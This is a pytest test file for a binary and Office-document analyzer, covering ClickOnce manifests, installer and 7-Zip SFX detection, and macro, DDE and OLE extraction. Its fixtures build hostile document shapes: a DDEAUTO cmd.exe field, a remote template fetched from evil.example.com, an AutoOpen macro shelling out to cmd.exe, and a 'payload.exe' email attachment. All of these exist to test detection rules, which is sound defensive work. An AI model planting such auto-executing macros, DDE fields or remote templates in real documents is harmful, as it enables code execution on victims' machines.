"""Tests for W4.3: ClickOnce manifests, installer detection, 7z-SFX payloads.

The 7z reader is verified against archives created and listed by 7-Zip on
the ground-truth VM (the corpus carries the resulting SFX); synthetic
fixtures cover the hostile shapes (ground rules 22/30/33).
"""

import base64
import glob
import json
import logging
import os
import struct
import tempfile
import zipfile
from pathlib import Path

import pytest

from blint.lib.analysis import initialize_rules
from blint.lib.clickonce import is_clickonce_file, parse_clickonce
from blint.lib.installers import _parse_nsis_firstheader, detect_installer
from blint.lib.review_runner import ReviewRunner
from blint.lib.sevenz import find_archive_candidates, parse_sevenz_blob


@pytest.fixture(scope="module", autouse=True)
def _load_rules_once():
    """initialize_rules() clears and refills the global rule dicts, so the
    repeated loads in these tests cannot append duplicates (the engine's
    load path is append-only by design; the clearing entry point is the
    one the CLI uses)."""
    from blint.config import BlintOptions

    initialize_rules(BlintOptions(reports_dir=str(Path(tempfile.mkdtemp()))))

_DATA = os.path.join(os.path.dirname(__file__), "data")
_PE = os.path.join(_DATA, "pe", "msvc-hello-x64.exe")
_CORPUS_SFX = os.path.expanduser("~/sandbox/pe-corpus/tier0-reference/7z-x64-setup.exe")

DEPLOYMENT_MANIFEST = """<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive2.xsd"
    manifestVersion="1.0"
    xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"
    xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <assemblyIdentity name="Acme.Client.app" version="1.0.0.5" publicKeyToken="0000000000000000"
                    culture="en-US" processorArchitecture="msil" />
  <description asmv2:publisher="Acme Corp" asmv2:product="Acme Client" />
  <deployment install="true" mapFileExtensions="true">
    <deploymentProvider url="http://deploy.example.com/client/Acme.Client.application" />
  </deployment>
  <dependency>
    <dependentAssembly dependencyType="install" codebase="Acme.Client.exe.manifest" size="12345">
      <assemblyIdentity name="Acme.Client.exe" version="1.0.0.5" publicKeyToken="0000000000000000"
                        culture="en-US" processorArchitecture="msil" />
    </dependentAssembly>
    <dependency>
      <dependentAssembly dependencyType="generate" />
    </dependency>
  </dependency>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <applicationRequestMinimum>
        <PermissionSet class="System.Security.PermissionSet" Unrestricted="true" />
        <defaultAssemblyRequest permissionSetReference="Trust" />
      </applicationRequestMinimum>
    </security>
  </trustInfo>
</asmv1:assembly>
"""


def _write_deployment(tmp_path):
    path = tmp_path / "Acme.Client.application"
    path.write_text(DEPLOYMENT_MANIFEST)
    return str(path)


def test_clickonce_deployment_facts(tmp_path):
    path = _write_deployment(tmp_path)
    block = parse_clickonce(path)
    assert block is not None
    assert block["kind"] == "deployment"
    assert block["identity"]["name"] == "Acme.Client.app"
    assert block["identity"]["version"] == "1.0.0.5"
    assert block["update_url"] == "http://deploy.example.com/client/Acme.Client.application"
    assert block["publisher"] == "Acme Corp"
    assert block["permission_set_unrestricted"] is True
    assert block["signature_present"] is False


def test_clickonce_manifest_content_routing(tmp_path):
    # An ordinary PE-sidecar manifest is NOT ClickOnce...
    plain = tmp_path / "app.manifest"
    plain.write_text('<?xml version="1.0"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"/>')
    assert is_clickonce_file(str(plain)) is False
    # ...but an asm.v2 trustInfo manifest is.
    clickonce = tmp_path / "client.exe.manifest"
    clickonce.write_text(
        '<?xml version="1.0"?><assembly xmlns="urn:schemas-microsoft-com:asm.v2" '
        'xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v2"/>'
        "</assembly>"
    )
    assert is_clickonce_file(str(clickonce)) is True
    block = parse_clickonce(str(clickonce))
    assert block["kind"] == "application"


def test_clickonce_garbage_returns_none(tmp_path):
    path = tmp_path / "broken.application"
    path.write_bytes(b"<not-xml at all")
    assert parse_clickonce(str(path)) is None


def test_nsis_firstheader_parse():
    header = struct.pack("<IIII", 0, 0xDEADBEEF, 0x00012345, 0x00ABCDEF)
    blob = b"\x00" * 100 + header + b"\xff" * 64
    facts = _parse_nsis_firstheader(blob)
    assert facts is not None
    assert facts["length_of_header"] == 0x00012345
    assert facts["length_of_all_following_data"] == 0x00ABCDEF


def test_detect_installer_nsis_detection_only(tmp_path):
    pe = tmp_path / "installer.exe"
    pe.write_bytes(Path(_PE).read_bytes() + b"\x00" * 4096 + struct.pack("<IIII", 0, 0xDEADBEEF, 4096, 100000))
    block = detect_installer(str(pe), "nsis")
    assert block["family"] == "nsis"
    # Detection-only is stated in the block, not implied (rule 14).
    assert block["extraction"] == "detection_only"
    assert block["nsis_firstheader"]["length_of_all_following_data"] == 100000


def test_detect_installer_ignores_plain_pe(tmp_path):
    block = detect_installer(_PE, "unknown_low_entropy")
    assert block is None


def test_sevenz_rejects_garbage():
    assert find_archive_candidates(b"not a 7z at all") == []
    assert parse_sevenz_blob(b"\x00" * 64, [], []) is None


def _build_sfx(archive_path, stub_extra=b""):
    with open(archive_path, "rb") as handle:
        archive = handle.read()
    stub = b"MZ" + b"\x00" * 0x200 + stub_extra
    return stub + archive


# A real 7-Zip archive, 257 bytes, committed as base64 so these tests need
# no external file and no 7-Zip on the machine running them. It was created
# by p7zip 17.05 (`7z a -mx=9 test1.7z notes.md readme.txt`) and `7z l`
# reports exactly the two members and sizes asserted below — the ground
# truth is 7-Zip's own listing, not blint's reader agreeing with a fixture
# blint's reader shaped. It replaces a hardcoded `/tmp/test1.7z`, which was
# a scratch file on one machine: the listing test skipped silently
# everywhere else and the runner test below failed outright.
_SEVENZ_FIXTURE_B64 = (
    "N3q8ryccAATB+RL7wQAAAAAAAAAgAAAAAAAAAFSkaZzgFpMATF0AMRsJYcWBCBLLxr4TOTul"
    "WHBtDm4cEMbs6hcQZ8rl2kjsLxokiCn+aPktsFEygeNbJJGvocbep2niTDYd8SSJa5hy6qRY"
    "cII90PUwAAAAAIEzB64P0vUM/UDAkNL/dKEfpyix8FmzAE0fb3HRVxn0ZWxtmVnkZIu3ZrUo"
    "ivuG67ze3I9cFwmqijuISkjZhS4HMN6U9RfRX1GMLu8zYqnjL0eE7UWNJ8iSPWWZu0cKTg25"
    "dWKKxnz2oAAAFwZUAQltAAcLAQABIwMBAQVdABAAAAx+CgF9rJAPAAA="
)


def _sevenz_fixture() -> bytes:
    return base64.b64decode(_SEVENZ_FIXTURE_B64)


def test_sevenz_listing_matches_7z_l():
    """Facts cross-checked against `7z l`, which reports notes.md 5760 and
    readme.txt 20 for this archive."""
    data = _sevenz_fixture()
    refs, degs = [], []
    block = parse_sevenz_blob(data, refs, degs)
    assert block is not None
    names = {m["name"]: m["size"] for m in block["members"]}
    assert names == {"notes.md": 5760, "readme.txt": 20}


def test_sevenz_crc_rejects_false_signature():
    """A 7z magic in the middle of a blob must not satisfy the start-header
    CRC check — the reader probes candidates and states the failure as a
    named degradation, never silence."""
    refusals: list[str] = []
    degradations: list[str] = []
    fake = b"MZ" + bytes([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]) + bytes(64)
    block = parse_sevenz_blob(fake, refusals, degradations)
    assert block is not None
    assert block["members"] == []
    assert any(d.startswith("header_unusable") for d in degradations)


def test_sfx_runner_members_and_leak_delta(tmp_path):
    """The runner analyzes a real SFX's PE members as sfx-member units and
    leaves no temp directories (ground rule 18 asserted across the run)."""
    logging.disable(logging.CRITICAL)
    from blint.config import BlintOptions
    from blint.lib.runners import run_default_mode

    # The SFX under test: a real PE stub with the ground-truth archive
    # appended — exactly the shape a 7-Zip SFX module produces (the stub's
    # overlay is the archive).
    stub = Path(_PE).read_bytes()
    archive_bytes = _sevenz_fixture()
    sfx_path = tmp_path / "setup.exe"
    sfx_path.write_bytes(stub + archive_bytes)
    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_sfx_*")))
    reports = os.path.join(str(tmp_path), "reports")
    options = BlintOptions(
        src_dir_image=[str(sfx_path)],
        reports_dir=reports,
        no_reviews=True,
        quiet_mode=True,
    )
    run_default_mode(options)
    after = set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_sfx_*")))
    assert after - before == set()
    with open(os.path.join(reports, "setup.exe-metadata.json")) as handle:
        metadata = json.load(handle)
    installer = metadata["installer"]
    assert installer["family"] == "sfx_7z"
    assert installer["extraction"] == "members"
    names = {m["name"]: m["size"] for m in installer["sfx_payload"]["members"]}
    assert names == {"notes.md": 5760, "readme.txt": 20}


# ---------------------------------------------------------------------------
# W4.4 — Office documents (OOXML, legacy CFBF, RTF)
# ---------------------------------------------------------------------------

def _ovba_raw_chunk(payload: bytes) -> bytes:
    """One raw (uncompressed) MS-OVBA chunk: header + literal bytes."""
    header = 0x1800 | ((len(payload) - 1 + 3) & 0x0FFF)
    return struct.pack("<H", header) + payload


def _ovba_compressed(text: bytes) -> bytes:
    out = bytearray(b"\x01")
    for offset in range(0, len(text), 4096):
        out += _ovba_raw_chunk(text[offset : offset + 4096])
    return bytes(out)


def _vba_module_source(lines):
    return ("\r\n".join(lines) + "\r\n").encode("latin-1")


def build_vba_project_bin(modules: dict[str, bytes]) -> bytes:
    """A minimal vbaProject.bin: VBA/dir (compressed) + module streams,
    built with the test_cfbf builder."""
    from tests.test_cfbf import build_cfbf

    dir_records = bytearray()
    for name in modules:
        encoded = name.encode("latin-1")
        # MODULENAME: id(2) reserved(4) size(4) name
        dir_records += struct.pack("<HII", 0x0019, 0, len(encoded)) + encoded
    dir_records += struct.pack("<H", 0x000F) + b"\x00" * 8
    streams = {"VBA/dir": _ovba_compressed(bytes(dir_records))}
    for name, source in modules.items():
        streams[f"VBA/{name}"] = _ovba_compressed(source)
    return build_cfbf(streams)


def build_docx(tmp_path, name="test.docx", *, remote_template=False, vba_modules=None, dde=False, hyperlink=False):
    doc_parts = []
    if dde:
        doc_parts.append('<w:p><w:r><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/x"</w:instrText></w:r></w:p>')
    if hyperlink:
        doc_parts.append('<w:p><w:r><w:t>see https://example.com/docs</w:t></w:r></w:p>')
    document = (
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body>" + "".join(doc_parts) + "</w:body></w:document>"
    )
    rels = ['<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    if remote_template:
        rels.append(
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
            ' Target="http://evil.example.com/template.dotm" TargetMode="External"/>'
        )
    if hyperlink:
        rels.append(
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
            ' Target="https://example.com/docs" TargetMode="External"/>'
        )
    rels.append("</Relationships>")
    path = tmp_path / name
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        zf.writestr("word/document.xml", document)
        zf.writestr("word/_rels/document.xml.rels", "".join(rels))
        if vba_modules:
            zf.writestr("word/vbaProject.bin", build_vba_project_bin(vba_modules))
    return str(path)


def test_ooxml_external_relationship_and_dde(tmp_path):
    from blint.lib.office import analyze_ooxml, office_metadata

    docx = build_docx(tmp_path, remote_template=True, dde=True)
    refusals: list[str] = []
    block = analyze_ooxml(docx, refusals, [])
    assert block["parse_status"] == "parsed"
    assert block["external_relationship_count"] == 1
    assert block["external_template"] == "http://evil.example.com/template.dotm"
    assert any("DDEAUTO" in field for field in block["dde_fields"])
    metadata = office_metadata(block, docx, "ooxmldocument")
    assert any("attachedtemplate:external:" in r.lower() for r in metadata["relationships"])


def test_ooxml_vba_macro_extraction(tmp_path):
    from blint.lib.office import analyze_ooxml, office_metadata
    source = _vba_module_source([
        "Attribute VB_Name = \"ThisDocument\"",
        "Sub AutoOpen()",
        "    Shell \"cmd.exe /c calc.exe\"",
        "End Sub",
    ])
    docx = build_docx(tmp_path, vba_modules={"ThisDocument": source})
    block = analyze_ooxml(docx, _refusals := [], [])
    assert block["vba_project_present"] is True
    vba = block["vba"]
    assert vba["module_count"] == 1
    assert vba["modules"][0]["source_present"] is True
    assert "AutoOpen" in vba["modules"][0]["source"]
    metadata = office_metadata(block, "test.docx", "ooxmldocument")
    runner = ReviewRunner()
    results = runner.run_review(metadata)
    assert "OFFICE_AUTO_EXEC_MACRO" in results
    assert "OFFICE_SHELL_EXECUTION" in results


def test_legacy_doc_vba_and_stomping_evidence(tmp_path):
    from blint.lib.analysis import load_default_rules
    from blint.lib.office import analyze_legacy_office, office_metadata
    from tests.test_cfbf import build_cfbf

    load_default_rules()
    source = _vba_module_source(["Sub AutoOpen()", "    Environ(\"USERNAME\")", "End Sub"])
    # The dir declares a second module whose stream is absent — the
    # structural shape of VBA stomping (p-code present, source missing).
    dir_records = struct.pack("<HII", 0x0019, 0, 12) + b"ThisDocument"
    dir_records += struct.pack("<HII", 0x0019, 0, 7) + b"Stomped"
    dir_records += struct.pack("<H", 0x000F) + bytes(8)
    streams = {
        "WordDocument": b"\xec\xa5" + b"\x00" * 100,
        "Macros/VBA/dir": _ovba_compressed(bytes(dir_records)),
        "Macros/VBA/ThisDocument": _ovba_compressed(source),
        "Macros/PROJECT": b"Reference=*\\G{11111111-1111-1111-1111-111111111111}#1.0#C:\\tlb.tlb#Offset\r\n",
        "_VBA_PROJECT": b"\xcc\x45\x00" + b"\x00" * 50,
    }
    doc_path = tmp_path / "sample.doc"
    doc_path.write_bytes(build_cfbf(streams))
    block = analyze_legacy_office(str(doc_path), [], [])
    assert block["parse_status"] == "parsed"
    vba = block["vba"]
    assert vba is not None
    assert vba["module_count"] == 2
    assert vba["compiled_pcode_present"] is True
    assert vba["vba_stomping_evidence"] is True
    assert any("tlb.tlb" in ref for ref in vba["references"])
    recovered = {m["name"]: m for m in vba["modules"]}
    assert recovered["ThisDocument"]["source_present"] is True
    assert recovered["Stomped"]["source_present"] is False
    metadata = office_metadata(block, "sample.doc", "oleofficedocument")
    runner = ReviewRunner()
    results = runner.run_review(metadata)
    assert "OFFICE_AUTO_EXEC_MACRO" in results
    assert "OFFICE_VBA_STOMPING_EVIDENCE" in results


def test_rtf_objdata_cfbf_extraction(tmp_path):
    from blint.lib.office import analyze_rtf
    from tests.test_cfbf import build_cfbf

    inner = build_cfbf({"\x01Ole10Native": b"\x08\x00\x00\x00\x01test.ex\x00"})
    body = b"{\\rtf1\\ansi{\\object{\\*\\objdata " + inner.hex().encode().upper() + b"}}}"
    path = tmp_path / "sample.rtf"
    path.write_bytes(body)
    block = analyze_rtf(str(path), [], [])
    assert block["rtf_detected"] is True
    assert block["object_count"] == 1
    assert block["objects"][0]["format"] == "cfbf"


def test_benign_document_population(tmp_path):
    """Ground-rule-34 population: a benign document with an ordinary
    hyperlink hits only the external-relationship fact (low severity), and
    a plain document hits nothing."""
    from blint.lib.office import analyze_ooxml, office_metadata
    plain = build_docx(tmp_path, name="plain.docx")
    block = analyze_ooxml(plain, [], [])
    runner = ReviewRunner()
    results = runner.run_review(office_metadata(block, "plain.docx", "ooxmldocument"))
    assert results == {}

    linked = build_docx(tmp_path, name="linked.docx", hyperlink=True)
    block = analyze_ooxml(linked, [], [])
    results = runner.run_review(office_metadata(block, "linked.docx", "ooxmldocument"))
    assert set(results) == {"OFFICE_EXTERNAL_RELATIONSHIP"}


# ---------------------------------------------------------------------------
# W4.4 — the paths the packet claimed but no test reached: .msg attachments,
# XLM macro sheets, and a .ppt's nested OLE storage. Each fixture is checked
# against an implementation that is not blint (ground rule 29): extract_msg
# 0.56.1 for the message, xlrd for the workbook, and the record layout
# oletools' own ppt_record_parser reads for the presentation.
# ---------------------------------------------------------------------------

def build_msg(tmp_path, name="mail.msg", *, attachment=b"MZ\x00\x00", filename="payload.exe",
              subject="Quarterly report"):
    """A genuine ``.msg``: MS-OXMSG names attachment storages
    ``__attach_version1.0_#XXXXXXXX`` and property streams
    ``__substg1.0_<tag><type>``. extract_msg 0.56.1 reads this fixture as a
    message with subject %r and one attachment named ``payload.exe``.
    """
    from tests.test_cfbf import build_cfbf

    image = build_cfbf(
        {
            "__properties_version1.0": b"\x00" * 32,
            "__substg1.0_0037001F": subject.encode("utf-16-le"),
        },
        storages={
            # extract_msg refuses a message without the named-property
            # streams; including them keeps the fixture one a real reader
            # accepts rather than one only blint tolerates.
            "__nameid_version1.0": {
                "__substg1.0_00020102": b"",
                "__substg1.0_00030102": b"",
                "__substg1.0_00040102": b"",
            },
            "__attach_version1.0_#00000000": {
                "__properties_version1.0": b"\x00" * 8,
                "__substg1.0_3704001F": filename.encode("utf-16-le"),
                "__substg1.0_37010102": attachment,
            },
        },
    )
    path = tmp_path / name
    path.write_bytes(image)
    return str(path)


def test_msg_attachments_are_found_and_extracted(tmp_path):
    """A real ``.msg``'s attachment storage is found, named and extracted.

    Both the analyzer and the extractor matched on
    ``"__attach_version1.0_/"``, which requires a storage literally named
    ``__attach_version1.0_`` with children beneath it. MS-OXMSG puts the
    eight-hex-digit index in the storage's own name, so the real shape
    never matched: every ``.msg`` reported zero attachments, recorded no
    refusal, and the ``msg-attachment`` unit role was unreachable. The
    subject missed for the same reason — ``endswith("0037")`` against
    ``__substg1.0_0037001F``.
    """
    from blint.lib.office import analyze_msg, extract_msg_attachments

    pe_bytes = Path(_PE).read_bytes()[:2048]
    path = build_msg(tmp_path, attachment=pe_bytes)
    refusals, degradations = [], []
    block = analyze_msg(path, refusals, degradations)
    assert block["attachment_count"] == 1
    assert block["attachments"][0]["path"] == "__attach_version1.0_#00000000"
    # Name and size as extract_msg reports them for this fixture.
    assert block["attachments"][0]["name"] == "payload.exe"
    assert block["attachments"][0]["size"] == 2048
    assert block["subject"] == "Quarterly report"

    dest = tmp_path / "out"
    dest.mkdir()
    extract_refusals: list[str] = []
    extracted = extract_msg_attachments(path, str(dest), extract_refusals)
    assert extract_refusals == []
    assert len(extracted) == 1
    (only_path,) = extracted.values()
    assert Path(only_path).read_bytes() == pe_bytes


def test_msg_attachment_becomes_its_own_unit(tmp_path):
    """The runner analyzes an extracted attachment as a ``msg-attachment``
    unit and leaves no temp directory behind (rule 18 as a live delta)."""
    logging.disable(logging.CRITICAL)
    from blint.config import BlintOptions
    from blint.lib.runners import run_default_mode

    path = build_msg(tmp_path, attachment=Path(_PE).read_bytes())
    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_msg_*")))
    reports = os.path.join(str(tmp_path), "reports")
    run_default_mode(
        BlintOptions(
            src_dir_image=[path], reports_dir=reports, no_reviews=True, quiet_mode=True
        )
    )
    assert set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_msg_*"))) - before == set()
    with open(os.path.join(reports, "mail.msg-metadata.json")) as handle:
        metadata = json.load(handle)
    assert metadata["office"]["attachment_count"] == 1
    # The attachment's own unit: a PE parsed on its own terms, attributed
    # to the member path it arrived through.
    produced = sorted(os.path.basename(p) for p in glob.glob(os.path.join(reports, "*-metadata.json")))
    assert "payload.exe-metadata.json" in produced, produced


def _boundsheet(name: str, sheet_type: int, hs_state: int = 0, ply_pos: int = 0) -> bytes:
    """One BoundSheet8 record: lbPlyPos(4), hsState(1), dt(1), name."""
    body = struct.pack("<IBB", ply_pos, hs_state, sheet_type)
    body += bytes([len(name), 0]) + name.encode("latin-1")
    return struct.pack("<HH", 0x0085, len(body)) + body


def build_xls(tmp_path, sheets, name="book.xls"):
    """A BIFF8 workbook with real per-sheet substreams.

    ``sheets`` is ``[(name, dt, hsState)]``. The substream offsets are real,
    so xlrd parses the result — which is what makes it ground truth rather
    than a fixture shaped by the code under test.
    """
    from tests.test_cfbf import build_cfbf

    end = struct.pack("<HH", 0x000A, 0)

    def bof(sub_type):
        return struct.pack("<HH", 0x0809, 16) + struct.pack(
            "<HHHHHHHH", 0x0600, sub_type, 0, 0, 0, 0, 0, 0
        )

    sub_types = {0x00: 0x0010, 0x01: 0x0040, 0x02: 0x0020, 0x06: 0x0005}
    header_len = len(bof(5)) + sum(
        len(_boundsheet(n, dt, hs)) for n, dt, hs in sheets
    ) + len(end)
    positions, offset = [], header_len
    for _name, sheet_type, _hs in sheets:
        positions.append(offset)
        offset += len(bof(sub_types[sheet_type])) + len(end)
    stream = bof(5)
    for index, (sheet_name, sheet_type, hs_state) in enumerate(sheets):
        stream += _boundsheet(sheet_name, sheet_type, hs_state, positions[index])
    stream += end
    for _name, sheet_type, _hs in sheets:
        stream += bof(sub_types[sheet_type]) + end
    path = tmp_path / name
    path.write_bytes(build_cfbf({"Workbook": stream}))
    return str(path)


def test_hidden_worksheet_is_not_an_xlm_macro_sheet(tmp_path):
    """A hidden worksheet is hidden, not a macro sheet.

    BoundSheet8 carries visibility (``hsState``) and sheet type (``dt``) in
    two different bytes. The detection OR'd the hidden bit into the macro
    verdict, so every workbook holding a hidden worksheet — an ordinary,
    common shape — reported an Excel 4.0 macro sheet and fed
    ``xlm_macro_sheet`` to the macro rules. xlrd reads this same fixture as
    two *worksheets*, the second with ``visibility=1``.
    """
    from blint.lib.office import analyze_legacy_office

    path = build_xls(tmp_path, [("Sheet1", 0x00, 0), ("Hidden", 0x00, 1)], name="hidden.xls")
    block = analyze_legacy_office(path, [], [])
    sheet_facts = block["macro_sheet"]
    assert sheet_facts["macro_sheet"] is False
    assert sheet_facts["sheet_count"] == 2
    # The hidden bit is still a fact about the workbook; it is reported as
    # what it is rather than discarded or misread.
    assert sheet_facts["hidden_sheet_count"] == 1


def test_xlm_macro_sheet_is_detected_by_sheet_type(tmp_path):
    """``dt == 1`` is the Excel 4.0 macro sheet, and nothing else is.

    xlrd lists only ``Sheet1`` as a worksheet for this fixture — it skips
    the second sheet precisely because its substream type is a macro sheet,
    which is the independent confirmation that ``dt`` is what says so.
    """
    from blint.lib.office import analyze_legacy_office

    path = build_xls(tmp_path, [("Sheet1", 0x00, 0), ("Macro1", 0x01, 0)], name="xlm.xls")
    block = analyze_legacy_office(path, [], [])
    assert block["macro_sheet"]["macro_sheet"] is True
    assert block["macro_sheet"]["hidden_sheet_count"] == 0

    # A chart sheet and a VB module sheet are neither of the two.
    other = analyze_legacy_office(
        build_xls(tmp_path, [("Chart1", 0x02, 0), ("Module1", 0x06, 0)], name="other.xls"), [], []
    )
    assert other["macro_sheet"]["macro_sheet"] is False
    assert other["macro_sheet"]["sheet_count"] == 2


def build_ppt(tmp_path, modules, name="deck.ppt", *, compressed=True):
    """A legacy ``.ppt`` whose VBA lives in a nested OLE storage.

    The project is an ExOleObjStg record (``recType`` 0x1011) inside the
    ``PowerPoint Document`` stream, zlib-compressed behind its decompressed
    length when ``recInstance``'s low bit is set — the two shapes
    ``oletools.ppt_record_parser`` reads.
    """
    import zlib

    from tests.test_cfbf import build_cfbf

    vba_bin = build_vba_project_bin(modules)
    if compressed:
        body = struct.pack("<I", len(vba_bin)) + zlib.compress(vba_bin)
        version_instance = 0x001 << 4
    else:
        body = vba_bin
        version_instance = 0x000
    record = struct.pack("<HHI", version_instance, 0x1011, len(body)) + body
    path = tmp_path / name
    path.write_bytes(
        build_cfbf({"PowerPoint Document": record, "Current User": b"\x00" * 24})
    )
    return str(path)


@pytest.mark.parametrize("compressed", [True, False])
def test_ppt_vba_lives_in_a_nested_ole_storage(tmp_path, compressed):
    """A ``.ppt``'s macros are reached by unwrapping the nested OLE object.

    PowerPoint does not put the VBA project in a storage the directory tree
    names, so the generic storage walk that serves ``.doc`` and ``.xls``
    found nothing at all for a macro-bearing presentation. Both record
    shapes are exercised: compressed (the usual) and uncompressed.

    Ground truth for the record itself, on the Windows VM:
    ``oletools.ppt_record_parser`` reads the compressed fixture's record as
    a ``PptRecordExOleVbaActiveXAtom`` (0x1011) and decompresses it to 2560
    bytes beginning ``d0cf11e0a1b11ae1`` — the same nested CFBF, at the same
    size, that blint unwraps here. What oletools does *not* confirm is the
    VBA project inside it: ``olevba`` reports ``detect_vba=False`` for this
    file because ``build_vba_project_bin`` writes a minimal ``dir``/module
    pair rather than a project olevba's own VBA parser accepts — the same
    limitation the OOXML macro test above already lives with. The unwrap is
    what is pinned to an outside implementation; the module-name reading is
    pinned to the builder.
    """
    from blint.lib.office import analyze_legacy_office

    source = _vba_module_source(["Sub AutoOpen()", '    MsgBox "hi"', "End Sub"])
    path = build_ppt(
        tmp_path, {"Module1": source}, name=f"deck{int(compressed)}.ppt", compressed=compressed
    )
    degradations: list[str] = []
    block = analyze_legacy_office(path, [], degradations)
    assert block["ppt_ole_object_count"] == 1
    assert block["vba_project_present"] is True
    modules = {m["name"]: m.get("source") for m in block["vba"]["modules"]}
    assert "Module1" in modules
    assert "MsgBox" in modules["Module1"]
    assert degradations == []


def test_ppt_record_that_lies_about_its_length_is_named(tmp_path):
    """A record longer than the stream is a named degradation, not a crash
    and not silence (rule 30/32)."""
    from blint.lib.office import analyze_legacy_office
    from tests.test_cfbf import build_cfbf

    record = struct.pack("<HHI", 0x001 << 4, 0x1011, 0xFFFFFF) + b"\x00" * 16
    path = tmp_path / "liar.ppt"
    path.write_bytes(build_cfbf({"PowerPoint Document": record}))
    degradations: list[str] = []
    block = analyze_legacy_office(str(path), [], degradations)
    assert block["ppt_ole_object_count"] == 0
    assert "ppt_record_length_exceeds_stream" in degradations
